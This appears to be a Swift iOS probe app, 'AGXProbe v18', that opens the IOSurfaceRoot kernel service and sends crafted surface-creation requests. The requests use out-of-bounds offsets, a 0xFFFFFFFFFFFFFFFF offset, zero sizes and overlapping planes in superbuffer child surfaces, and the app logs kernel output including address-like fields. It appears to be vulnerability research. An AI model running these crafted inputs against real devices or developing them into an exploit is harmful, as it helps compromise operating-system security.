import SwiftUI
import Darwin

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v18 — superbuffer child bounds").font(.headline)
            Text("parent surface + crafted child offsets/sizes").font(.caption2).foregroundColor(.secondary)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v18")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false
    private let OUT_SIZE = 0xC68
    private let PF_BGRA: UInt64 = 0x42475241

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func log(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    private func xmlNul(_ d: Any) -> Data? {
        guard let data = try? PropertyListSerialization.data(fromPropertyList: d, format: .xml, options: 0) else { return nil }
        return data + Data([0])
    }

    private func stripNul(_ data: Data, tag: String) -> Data? {
        guard let s = String(data: data, encoding: .utf8) else { return nil }
        guard let a = s.range(of: "<\(tag)"),
              let b = s.range(of: "</\(tag)>", options: .backwards) else { return nil }
        return (String(s[a.lowerBound..<b.upperBound]).data(using: .utf8) ?? Data()) + Data([0])
    }

    private func num(_ v: UInt64) -> Int64 { Int64(bitPattern: v) }

    private func plane(_ off: UInt64, _ size: UInt64) -> [String: Any] {
        return [
            "IOSurfacePlaneWidth": 64,
            "IOSurfacePlaneHeight": 64,
            "IOSurfacePlaneBytesPerRow": 256,
            "IOSurfacePlaneBytesPerElement": 4,
            "IOSurfacePlaneOffset": num(off),
            "IOSurfacePlaneSize": num(size),
        ]
    }

    private func parentDict(_ alloc: UInt64, planes: Int = 1) -> [String: Any] {
        return [
            "IOSurfaceWidth": 64,
            "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4,
            "IOSurfaceBytesPerRow": 256,
            "IOSurfaceAllocSize": num(alloc),
            "IOSurfacePixelFormat": PF_BGRA,
            "IOSurfacePlaneInfo": (0..<planes).map { plane(UInt64($0) * 0x4000, 0x4000) },
        ]
    }

    private func childDict(off: UInt64, size: UInt64, alloc: UInt64, flag: String) -> [String: Any] {
        var d: [String: Any] = [
            "IOSurfaceWidth": 64,
            "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4,
            "IOSurfaceBytesPerRow": 256,
            "IOSurfaceAllocSize": num(alloc),
            "IOSurfacePixelFormat": PF_BGRA,
            "IOSurfacePlaneInfo": [plane(off, size)],
        ]
        d[flag] = 1
        return d
    }

    private func call(conn: io_connect_t, sel: UInt32, tag: String, scalar: UInt64,
                      scalarCount: UInt32, payload: Data, outSize: Int) -> [UInt8] {
        var inScalar: [UInt64] = [scalar]
        var outScalar: [UInt64] = [0]
        var outScalarCount: UInt32 = 0
        var out = [UInt8](repeating: 0xCC, count: max(outSize, 1))
        var outLen = outSize
        let kr: kern_return_t = payload.withUnsafeBytes { raw in
            out.withUnsafeMutableBytes { ob in
                IOConnectCallMethod(conn, sel,
                                    &inScalar, scalarCount,
                                    raw.baseAddress, payload.count,
                                    &outScalar, &outScalarCount,
                                    ob.baseAddress, &outLen)
            }
        }
        let u = UInt32(bitPattern: kr)
        var hex = ""
        for i in 0..<min(0xA0, out.count) {
            if i % 16 == 0 { hex += String(format: "\n    %04x: ", i) }
            hex += String(format: "%02x ", out[i])
        }
        log(String(format: "%@ sel=%u scalar=%llu kr=0x%08x in=%lu outLen=0x%x%@",
                   tag, sel, scalar, u, payload.count, outLen, hex))
        return out
    }

    private func create(conn: io_connect_t, tag: String, parent: UInt32, _ d: [String: Any]) -> [UInt8]? {
        guard let full = xmlNul(d), let p = stripNul(full, tag: "dict") else {
            log("\(tag): serialize failed"); return nil
        }
        return call(conn: conn, sel: 0, tag: tag, scalar: UInt64(parent), scalarCount: 1, payload: p, outSize: OUT_SIZE)
    }

    private func idFrom(_ out: [UInt8]) -> UInt32? {
        guard out.count >= 0x1C else { return nil }
        return UInt32(out[0x18]) | (UInt32(out[0x19]) << 8) | (UInt32(out[0x1A]) << 16) | (UInt32(out[0x1B]) << 24)
    }

    private func u64(_ out: [UInt8], _ o: Int) -> UInt64 {
        guard out.count >= o + 8 else { return 0 }
        var v: UInt64 = 0
        for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
        return v
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        log("=== AGXProbe v18 — superbuffer child bounds ===")

        let service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"))
        guard service != 0 else { log("IOSurfaceRoot service = NULL"); status = "Failed"; isRunning = false; return }
        defer { IOObjectRelease(service) }
        var conn: io_connect_t = 0
        let okr = IOServiceOpen(service, mach_task_self_, 0, &conn)
        log(String(format: "IOServiceOpen type=0 kr=0x%x conn=0x%x", okr, conn))
        guard okr == 0 else { status = "Failed"; isRunning = false; return }
        defer { IOServiceClose(conn) }

        let pOut = create(conn: conn, tag: "P0 parent alloc=0x4000", parent: 0, parentDict(0x4000))
        guard let pid = pOut.flatMap(idFrom), let po = pOut else { log("parent failed"); status = "Failed"; isRunning = false; return }
        log("PARENT id=\(pid) addr0=0x\(String(u64(po, 0), radix: 16)) addr8=0x\(String(u64(po, 8), radix: 16)) addr10=0x\(String(u64(po, 0x10), radix: 16))")

        let cases: [(String, UInt64, UInt64, UInt64, String)] = [
            ("A1 off=0 size=4000 alloc=4000", 0x0, 0x4000, 0x4000, "IOSurfaceAllocateFromSuperbuffer"),
            ("A2 off=4000 size=4000", 0x4000, 0x4000, 0x4000, "IOSurfaceAllocateFromSuperbuffer"),
            ("A3 off=3FFF size=4000", 0x3FFF, 0x4000, 0x4000, "IOSurfaceAllocateFromSuperbuffer"),
            ("A4 off=2000 size=4000", 0x2000, 0x4000, 0x4000, "IOSurfaceAllocateFromSuperbuffer"),
            ("A5 off=0 size=8000 alloc=8000", 0x0, 0x8000, 0x8000, "IOSurfaceAllocateFromSuperbuffer"),
            ("A6 off=0 size=4000 Superbuffer", 0x0, 0x4000, 0x4000, "IOSurfaceSuperbuffer"),
            ("A7 off=FFFF.. size=4000", 0xFFFFFFFFFFFFFFFF, 0x4000, 0x4000, "IOSurfaceAllocateFromSuperbuffer"),
            ("A8 off=4000 size=0", 0x4000, 0x0, 0x4000, "IOSurfaceAllocateFromSuperbuffer"),
            ("A9 off=0 size=0 alloc=0", 0x0, 0x0, 0x0, "IOSurfaceAllocateFromSuperbuffer"),
        ]

        log("\n--- child creates (parent \(pid)) ---")
        for (tag, off, size, alloc, flag) in cases {
            _ = create(conn: conn, tag: tag, parent: pid, childDict(off: off, size: size, alloc: alloc, flag: flag))
        }

        log("\n--- 20-plane parent and overlap ---")
        let p20 = create(conn: conn, tag: "P20 parent 20 planes alloc=0x50000", parent: 0, parentDict(0x50000, planes: 20))
        if let p20 = p20, let pid20 = idFrom(p20) {
            log("P20 id=\(pid20) planes=\(u64(p20, 0x58))")
            var overlap: [String: Any] = [
                "IOSurfaceWidth": 64, "IOSurfaceHeight": 64,
                "IOSurfaceBytesPerElement": 4, "IOSurfaceBytesPerRow": 256,
                "IOSurfaceAllocSize": 0x4000, "IOSurfacePixelFormat": PF_BGRA,
                "IOSurfacePlaneInfo": (0..<20).map { _ in plane(0, 0x4000) },
            ]
            overlap["IOSurfaceAllocateFromSuperbuffer"] = 1
            _ = create(conn: conn, tag: "A10 20x overlap off0", parent: pid20, overlap)
        } else {
            log("P20 failed")
        }

        log("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
